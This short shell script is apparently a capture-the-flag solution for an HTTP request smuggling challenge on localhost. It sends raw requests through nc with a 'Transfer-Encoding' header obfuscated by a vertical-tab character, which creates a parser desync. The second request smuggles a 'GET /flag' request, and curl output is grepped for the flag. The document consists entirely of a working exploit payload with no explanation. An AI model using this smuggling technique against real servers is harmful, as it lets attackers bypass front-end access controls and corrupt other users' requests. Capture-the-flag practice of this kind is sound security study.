printf 'POST / HTTP/1.1\r\n'\
'Host: 127.0.0.1\r\n'\
'Connection: keep-alive\r\n'\
'Content-Length: 6\r\n'\
'Transfer-Encoding:\x0bchunked\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'G' | nc 127.0.0.1 10081 & curl 127.0.0.1:10081 -X POST | grep flag{.*} --color

echo "============================="
sleep 0.5

printf 'POST / HTTP/1.1\r\n'\
'Host: 127.0.0.1\r\n'\
'Connection: keep-alive\r\n'\
'Content-Length: 28\r\n'\
'Transfer-Encoding:\x0bchunked\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'GET /flag HTTP/1.1\r\n'\
'a: ' | nc 127.0.0.1 10081 & curl 127.0.0.1:10081 | grep flag{.*} --color



